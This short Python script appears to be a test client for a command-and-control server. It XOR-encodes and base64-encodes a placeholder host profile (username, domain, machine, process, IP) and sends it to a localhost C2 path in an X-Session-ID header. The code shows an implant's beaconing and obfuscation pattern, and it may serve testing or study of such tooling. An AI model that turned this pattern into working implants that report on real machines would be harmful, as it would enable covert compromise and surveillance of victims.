import requests
import base64
from config import C2

# xor function that uses the key 0xfa


def xor(data):
    key = C2['key']
    print("[+] XOR Using key: " + str(key))
    key = int(key, 16)
    return bytes([data[i] ^ key for i in range(len(data))])


def main():
    # This is the payload that will be sent to the C2
    payload = "username=test&domain=test&machine=test&process=test&version=test&arch=test&ip=test&pid=test"
    # XOR the payload with the key
    payload = xor(payload.encode('utf-8'))
    # base64 encode the payload
    payload = base64.b64encode(payload)
    # Send the payload to the C2
    request = requests.get("http://127.0.0.1:23000"+C2['path'], headers={"X-Session-ID": payload})
    print(request.text)


if __name__ == "__main__":
    main()
